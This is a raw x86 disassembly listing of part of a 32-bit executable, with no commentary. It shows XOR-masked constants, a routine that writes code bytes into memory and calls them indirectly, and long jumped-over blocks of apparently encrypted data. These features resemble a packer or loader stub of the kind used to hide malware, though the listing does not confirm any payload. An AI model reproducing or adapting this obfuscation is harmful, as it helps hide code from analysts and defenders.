  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	jmp    0x4158ea
  415960:	or     eax,0x7f106d15
  415965:	js     0x4158fc
  415967:	jle    0x4159e1
  415969:	js     0x4159e2
  41596b:	or     eax,0x36454c8a
  415970:	mov    ds:0x4cc02c92,al
  415975:	jmp    0x4159c8
  415977:	pop    DWORD PTR [edx-0x28]
  41597a:	jno    0x4159fa
  41597c:	jbe    0x4159e0
  41597e:	jo     0x41594d
  415980:	inc    esp
  415981:	aam    0x38
  415983:	inc    esp
  415984:	sub    esp,DWORD PTR [edx]
  415986:	mov    edx,0xc5272650
  41598b:	pop    ds
  41598c:	stos   DWORD PTR es:[edi],eax
  41598d:	or     ah,ch
  41598f:	mov    edi,0x99b6459b
  415994:	or     eax,0x1dcfc2b3
  415999:	test   BYTE PTR [ecx+0x2929145e],dh
  41599f:	push   esp
  4159a0:	iret   
  4159a1:	inc    DWORD PTR [ebp-0x26]
  4159a4:	xchg   esi,eax
  4159a5:	push   eax
  4159a6:	push   ebp
  4159a7:	lahf   
  4159a8:	js     0x4159f7
  4159aa:	mov    cl,0x88
  4159ac:	pop    es
  4159ad:	fsubrp st(7),st
  4159af:	shl    al,cl
  4159b1:	sti    
  4159b2:	and    ecx,ebx
  4159b4:	inc    ebx
  4159b5:	je     0x415947
  4159b7:	cmp    esp,DWORD PTR ds:0x65aa99eb
  4159bd:	jmp    0x7150dc02
  4159c2:	pop    ebx
  4159c3:	mov    ds:0x1bf3fc38,eax
  4159c8:	loopne 0x415998
  4159ca:	bound  edi,QWORD PTR [edx+0x28ac987e]
  4159d0:	sbb    ebx,DWORD PTR [esi+0x2d59dec3]
  4159d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159d7:	inc    edi
  4159d8:	popa   
  4159d9:	mov    edx,0x81da724
  4159de:	ss mov ebp,0xe6cf51d2
  4159e4:	rcl    DWORD PTR [edx-0x3955df6f],0x88
  4159eb:	mov    WORD PTR [ecx-0x4d],gs
  4159ee:	je     0x415a6c
  4159f0:	loopne 0x415a22
  4159f2:	sub    DWORD PTR ds:[ebx+0x8a9d7ab],esi
  4159f9:	jg     0x415a73
  4159fb:	rcr    al,0xd6
  4159fe:	inc    esp
  4159ff:	mov    bl,0xd9
  415a01:	leave  
  415a02:	adc    al,0x68
  415a04:	clc    
  415a05:	xor    eax,0xbc8a6cf9
  415a0a:	ja     0x4159d8
  415a0c:	fs push ss
  415a0e:	test   BYTE PTR [esi+edx*8],ah
  415a11:	dec    ebx
  415a12:	sbb    BYTE PTR [ebx],ah
  415a14:	pop    ebp
  415a15:	ror    cl,0xf3
  415a18:	xchg   ebx,eax
  415a19:	ret    
  415a1a:	xchg   ecx,eax
  415a1b:	mov    bl,0x52
  415a1d:	hlt    
  415a1e:	mov    dh,0xd1
  415a20:	aad    0x51
  415a22:	clc    
  415a23:	cmp    eax,0xddb1ae1c
  415a28:	mov    ebx,0xe5dc15d8
  415a2d:	fwait
  415a2e:	xchg   edi,eax
  415a2f:	jle    0x4159b8
  415a31:	xchg   BYTE PTR [eax],dl
  415a33:	mov    al,0xef
  415a35:	mov    edx,0x212a6ef8
  415a3a:	inc    ecx
  415a3b:	aas    
  415a3c:	aam    0x3c
  415a3e:	xchg   ecx,eax
  415a3f:	in     eax,dx
  415a40:	dec    edx
  415a41:	and    DWORD PTR [edx-0x72],0x5b
  415a45:	stos   BYTE PTR es:[edi],al
  415a46:	sahf   
  415a47:	pop    esp
  415a48:	and    dh,BYTE PTR [edi+edi*1+0x58]
  415a4c:	cli    
  415a4d:	cli    
  415a4e:	retf   
  415a4f:	inc    esi
  415a50:	cld    
  415a51:	xchg   ebp,eax
  415a52:	sub    eax,0xa933113
  415a57:	cmp    al,0xf6
  415a59:	xchg   ecx,eax
  415a5a:	shl    DWORD PTR [ebx+0x57],0xd3
  415a5e:	push   cs
  415a5f:	fmul   st,st(0)
  415a61:	mov    ds:0xc8c552e9,al
  415a66:	js     0x415ac5
  415a68:	sbb    cl,bh
  415a6a:	xor    ch,dl
  415a6c:	aam    0xbc
  415a6e:	adc    esi,DWORD PTR [edi+ecx*4-0x1f358349]
  415a75:	jnp    0x415a9f
  415a77:	push   edx
  415a78:	xchg   edi,eax
  415a79:	push   edx
  415a7a:	cli    
  415a7b:	bound  edx,QWORD PTR [esi]
  415a7d:	mov    esp,0x492cbb14
  415a82:	xchg   cl,cl
  415a84:	mov    ebx,0x8a8b5237
  415a89:	imul   ecx,DWORD PTR [edi],0xffffffa3
  415a8c:	adc    DWORD PTR [esi+0x28],ebp
  415a8f:	mov    ch,0x5a
  415a91:	push   cs
  415a92:	mov    ds:0xa5dc355b,al
  415a97:	mov    ds,WORD PTR [edx+0x54e3184a]
  415a9d:	xchg   esp,eax
  415a9e:	pop    eax
  415a9f:	and    BYTE PTR [eax-0x7ec5c77b],0xfe
  415aa6:	rcl    DWORD PTR [ebx],cl
  415aa8:	leave  
  415aa9:	sub    eax,0x1c8a76e
  415aae:	mov    dl,0xa1
  415ab0:	aas    
  415ab1:	mov    dl,BYTE PTR [ebp-0x5dfece26]
  415ab7:	mov    ebp,0x8e11cfa1
  415abc:	push   ebx
  415abd:	ins    DWORD PTR es:[edi],dx
  415abe:	or     BYTE PTR [edx-0x5b],dl
  415ac1:	nop
  415ac2:	cmp    DWORD PTR [eax+0xf992b82],ebx
  415ac8:	sub    BYTE PTR ds:0x6c8e1838,dh
  415ace:	sbb    esi,DWORD PTR [esi]
  415ad0:	pop    ebx
  415ad1:	out    0x21,al
  415ad3:	cwde   
  415ad4:	inc    eax
  415ad5:	lds    edx,FWORD PTR [edx]
  415ad7:	or     al,0x26
  415ad9:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  415adb:	adc    BYTE PTR ss:[edi+0x11],bl
  415adf:	mov    bl,0x96
  415ae1:	adc    DWORD PTR [esi-0x61],0x43
  415ae5:	es sahf 
  415ae7:	test   DWORD PTR [eax+edi*2+0x1f],esi
  415aeb:	cld    
  415aec:	inc    edx
  415aed:	jnp    0x415a93
  415aef:	and    DWORD PTR [edx+0x4c],ebx
  415af2:	xchg   ecx,eax
  415af3:	xor    BYTE PTR [esi+ecx*4],ch
  415af6:	std    
  415af7:	es sbb bh,dh
  415afa:	stos   BYTE PTR es:[edi],al
  415afb:	jp     0x415b60
  415afd:	call   0xcde8:0x844bb21c
  415b04:	jo     0x415b36
  415b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b07:	ins    DWORD PTR es:[edi],dx
  415b08:	and    ebx,ebx
  415b0a:	sub    al,0xde
  415b0c:	cmp    esp,DWORD PTR [eax]
  415b0e:	lea    ecx,[ecx*8-0x9c89d37]
  415b15:	push   eax
  415b16:	jnp    0x415b58
  415b18:	loop   0x415b26
  415b1a:	enter  0x96a5,0xb4
  415b1e:	test   DWORD PTR ds:0x46f57759,edx
  415b24:	aad    0x21
  415b26:	call   0x4df5a5e7
  415b2b:	jns    0x415afa
  415b2d:	pop    ebp
  415b2e:	test   eax,0x83a7338c
  415b33:	xchg   edi,eax
  415b34:	repnz mov bl,bl
  415b37:	mov    dl,al
  415b39:	ss iret 
  415b3b:	in     al,dx
  415b3c:	xor    BYTE PTR [edi-0x7c0be9fd],ah
  415b42:	in     al,0x6f
  415b44:	dec    ebx
  415b45:	add    DWORD PTR [ebx],esi
  415b47:	int    0x90
  415b49:	xchg   esp,eax
  415b4a:	push   edi
  415b4b:	xchg   ecx,eax
  415b4c:	test   DWORD PTR [ebx-0x6f],ebp
  415b4f:	or     dh,BYTE PTR [edx]
  415b51:	or     DWORD PTR [eax+0x15],ebx
  415b54:	cmp    DWORD PTR [ebp+0x14467faa],ebx
  415b5a:	xchg   ebx,eax
  415b5b:	add    ebp,DWORD PTR [ecx-0x21ef21f9]
  415b61:	in     eax,0x27
  415b63:	cs dec eax
  415b65:	adc    BYTE PTR [edx],dh
  415b67:	dec    esp
  415b68:	in     eax,dx
  415b69:	ror    esp,1
  415b6b:	inc    esi
  415b6c:	pop    eax
  415b6d:	out    dx,eax
  415b6e:	or     al,0x21
  415b70:	lock push 0xa4035eb8
  415b76:	jo     0x415bf5
  415b78:	mov    DWORD PTR [esi+edx*1+0x28db76b8],ebp
  415b7f:	lea    edi,[ebp+0x42]
  415b82:	inc    ebx
  415b83:	adc    eax,0x7014da19
  415b88:	inc    edx
  415b89:	inc    edx
  415b8a:	ins    DWORD PTR es:[edi],dx
  415b8b:	cmc    
  415b8c:	paddw  mm4,QWORD PTR cs:[esi+0x62]
  415b91:	push   ds
  415b92:	das    
  415b93:	inc    ecx
  415b94:	sbb    esp,DWORD PTR [ebp+0x5b]
  415b97:	adc    BYTE PTR [esi+eax*2],al
  415b9a:	fdiv   st,st(1)
  415b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b9d:	mov    al,ds:0x5c2b26a9
  415ba2:	xchg   esp,eax
  415ba3:	out    0x45,al
  415ba5:	add    eax,0xd8b93a1c
  415baa:	in     eax,dx
  415bab:	clc    
  415bac:	sub    BYTE PTR [ebx+edi*2+0x52351e8c],cl
  415bb3:	fldenv [edx-0x6d7e4883]
  415bb9:	or     al,0xad
  415bbb:	or     DWORD PTR [ecx+eiz*1+0x7ac29812],edx
  415bc2:	out    0x2f,eax
  415bc4:	and    edx,DWORD PTR [edx]
  415bc6:	idiv   DWORD PTR [ebx-0x62]
  415bc9:	sub    al,BYTE PTR [esi]
  415bcb:	mov    ebx,0x981a620c
  415bd0:	jl     0x415be3
  415bd2:	xor    ah,BYTE PTR [ecx-0x28d439a2]
  415bd8:	add    DWORD PTR [ebx+ebx*4+0x89af55b],edi
  415bdf:	xchg   edi,eax
  415be0:	mov    WORD PTR [edx-0x79],?
  415be3:	push   0xffffffaf
  415be5:	pusha  
  415be6:	jno    0x415b72
  415be8:	in     eax,0x34
  415bea:	jns    0x415b7f
  415bec:	inc    esp
  415bed:	das    
  415bee:	push   cs
  415bef:	rcr    ah,0xe5
  415bf2:	cmp    eax,ecx
  415bf4:	jg     0x415c2d
  415bf6:	mov    edx,ecx
  415bf8:	rol    BYTE PTR [edi],0x6a
  415bfb:	hlt    
  415bfc:	xor    bh,dl
  415bfe:	fiadd  DWORD PTR [edi]
  415c00:	jmp    0x48ada756
  415c05:	push   ecx
  415c06:	push   ecx
  415c07:	mov    DWORD PTR ds:0x42a7f5,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	stos   DWORD PTR es:[edi],eax
  415c40:	mov    ah,0x36
  415c42:	sbb    al,0x8a
  415c44:	adc    eax,0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	pop    ebp
  415c4c:	dec    eax
  415c4d:	std    
  415c4e:	dec    ebp
  415c4f:	lea    ebx,[esi+0x367951d2]
  415c55:	dec    edi
  415c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c57:	jmp    0xa5c2:0xf7c9ca46
  415c5e:	push   ebp
  415c5f:	dec    edi
  415c60:	aad    0x39
  415c62:	mov    al,0xf1
  415c64:	xchg   DWORD PTR [ebx],ecx
  415c66:	outs   dx,BYTE PTR ds:[esi]
  415c67:	call   0x7212d070
  415c6c:	and    ah,BYTE PTR [eax]
  415c6e:	int3   
  415c6f:	sub    ch,BYTE PTR [edi+0x12f824]
  415c75:	mov    al,ds:0x75d7423f
  415c7a:	out    dx,eax
  415c7b:	arpl   WORD PTR [edi-0x50],sp
  415c7e:	fisubr DWORD PTR [edi+0x665260d0]
  415c84:	test   eax,0x6c20e54
  415c89:	jle    0x415cdb
  415c8b:	loope  0x415c6b
  415c8d:	enter  0x29ae,0x98
  415c91:	or     ecx,DWORD PTR [eax]
  415c93:	and    DWORD PTR [edx],esi
  415c95:	fiadd  WORD PTR [ebx]
  415c97:	loopne 0x415cd9
  415c99:	leave  
  415c9a:	inc    edx
  415c9b:	xor    al,0xd9
  415c9d:	xchg   ecx,eax
  415c9e:	push   esp
  415c9f:	mov    esp,DWORD PTR [ebp+0x242dae40]
  415ca5:	jp     0x415cf3
  415ca7:	lahf   
  415ca8:	ins    BYTE PTR es:[edi],dx
  415ca9:	push   cs
  415caa:	push   ss
  415cab:	(bad)  [eax]
  415cad:	push   ecx
  415cae:	mov    eax,0x50b0d91
  415cb3:	bt     DWORD PTR [esi+0x751f8c08],esp
  415cba:	sbb    BYTE PTR [edx+0x69a8aabf],bl
  415cc0:	(bad)  
  415cc1:	jg     0x415ca4
  415cc3:	(bad)  
  415cc4:	pop    ebx
  415cc5:	xchg   esi,eax
  415cc6:	dec    ecx
  415cc7:	xchg   esp,eax
  415cc8:	fcomp  QWORD PTR [esi+edx*4-0x33]
  415ccc:	dec    ebx
  415ccd:	ins    BYTE PTR es:[edi],dx
  415cce:	pushf  
  415ccf:	dec    eax
  415cd0:	loopne 0x415cb2
  415cd2:	mov    ah,0x73
  415cd4:	mov    dh,0xc2
  415cd6:	mov    ebx,0x24c8025f
  415cdb:	mov    edi,0x60b6bff4
  415ce0:	and    dl,BYTE PTR [edi]
  415ce2:	xor    al,0xf6
  415ce4:	push   0xfffffff9
  415ce6:	aam    0x8
  415ce8:	mov    gs,WORD PTR ds:0xd7f41c76
  415cee:	fwait
  415cef:	cmp    DWORD PTR [esi-0x49],esi
  415cf2:	adc    al,0x74
  415cf4:	xchg   esi,eax
  415cf5:	call   0xb8e0:0xcc9e2abf
  415cfc:	shr    DWORD PTR [ecx-0x6432eaf6],1
  415d02:	fild   WORD PTR [eax-0x8]
  415d05:	and    al,0x48
  415d07:	inc    edx
  415d08:	xchg   ebp,eax
  415d09:	gs jbe 0x415cf0
  415d0c:	scas   eax,DWORD PTR es:[edi]
  415d0d:	cld    
  415d0e:	adc    ah,BYTE PTR [ecx+0x3b3d693a]
  415d14:	pop    esi
  415d15:	xor    DWORD PTR [eax+0x6a4a3bb4],esp
  415d1b:	mov    fs:0x9a3015c3,eax
  415d21:	mov    ebp,0xfa6e0c2d
  415d26:	or     esp,DWORD PTR [esi+edi*4+0x55]
  415d2a:	js     0x415d5e
  415d2c:	shl    ebx,1
  415d2e:	mov    esi,0x91166fd8
  415d33:	cmp    eax,0x8b82a6b8
  415d38:	addr16 inc edx
  415d3a:	int3   
  415d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d3c:	push   edx
  415d3d:	fld    QWORD PTR [edx-0x4c4e50b8]
  415d43:	jnp    0x415ccf
  415d45:	sub    dh,0x70
  415d48:	cmc    
  415d49:	sub    esi,DWORD PTR [esi-0x49964d02]
  415d4f:	leave  
  415d50:	in     eax,dx
  415d51:	mov    dh,0xd
  415d53:	fcomi  st,st(5)
  415d55:	xor    al,0x5a
  415d57:	jns    0x415d3a
  415d59:	loope  0x415d10
  415d5b:	mov    esi,0x4988eea2
  415d60:	adc    eax,0xa8034af2
  415d65:	pop    ss
  415d66:	pop    ebx
  415d67:	cmp    BYTE PTR [esi],dl
  415d69:	mov    ds:0x93893447,al
  415d6e:	and    dh,ch
  415d70:	mov    ecx,DWORD PTR [ecx-0x4c]
  415d73:	add    cl,BYTE PTR [ecx-0x2]
  415d76:	in     eax,dx
  415d77:	out    0x99,al
  415d79:	ret    
  415d7a:	pop    ds
  415d7b:	imul   esp,DWORD PTR [esi],0xffffffcc
  415d7e:	sbb    BYTE PTR [edx+0x33481795],bl
  415d84:	mov    bh,0x2f
  415d86:	cs ja  0x415db3
  415d89:	add    ebx,0xb620b949
  415d8f:	aad    0xe3
  415d91:	ror    DWORD PTR [edi],1
  415d93:	mov    ecx,0xbba4efcc
  415d98:	push   esp
  415d99:	xchg   edx,eax
  415d9a:	mov    esp,0x991b3b0e
  415d9f:	and    DWORD PTR [eax-0x3887e3b6],ebx
  415da5:	loope  0x415e26
  415da7:	dec    esi
  415da8:	jae    0x415df7
  415daa:	sbb    ebx,DWORD PTR [edi-0x47d91e2d]
  415db0:	lock cmp bl,ch
  415db3:	mov    dl,0xf6
  415db5:	xchg   esp,eax
  415db6:	scas   al,BYTE PTR es:[edi]
  415db7:	sub    edi,DWORD PTR [edx]
  415db9:	jns    0x415d49
  415dbb:	sbb    BYTE PTR [eax],0xc6
  415dbe:	hlt    
  415dbf:	and    BYTE PTR [ebx+0x6b],al
  415dc2:	aam    0x4
  415dc4:	sub    eax,DWORD PTR [esi-0x3d]
  415dc7:	es out 0xa6,al
  415dca:	sub    ebp,ebp
  415dcc:	adc    BYTE PTR [ebp+0x54],ah
  415dcf:	jmp    0xb9c4:0x2487d990
  415dd6:	in     eax,dx
  415dd7:	push   ecx
  415dd8:	inc    eax
  415dd9:	outs   dx,BYTE PTR ds:[esi]
  415dda:	shr    edi,cl
  415ddc:	nop
  415ddd:	xor    eax,0x17b6e9a2
  415de2:	dec    ebp
  415de3:	push   ebx
  415de4:	sbb    cl,BYTE PTR [edx-0x12f25d87]
  415dea:	jns    0x415dc5
  415dec:	sub    dh,BYTE PTR [edi-0x49]
  415def:	fst    QWORD PTR [edi-0x5b]
  415df2:	(bad)  
  415df3:	scas   al,BYTE PTR es:[edi]
  415df4:	or     al,0x45
  415df6:	or     al,0x6c
  415df8:	idiv   DWORD PTR [esi+0x56]
  415dfb:	sub    eax,0xee11d79e
  415e00:	call   0xa793:0x4117cc3a
  415e07:	or     eax,0x5fdf5793
  415e0c:	push   ecx
  415e0d:	test   eax,0x924a82f0
  415e12:	rcr    DWORD PTR [edi+0x2b],cl
  415e15:	(bad)  
  415e16:	sbb    BYTE PTR [ebp-0x192f0dc9],bl
  415e1c:	sbb    al,0xca
  415e1e:	mov    edi,DWORD PTR [edi]
  415e20:	jg     0x415e4b
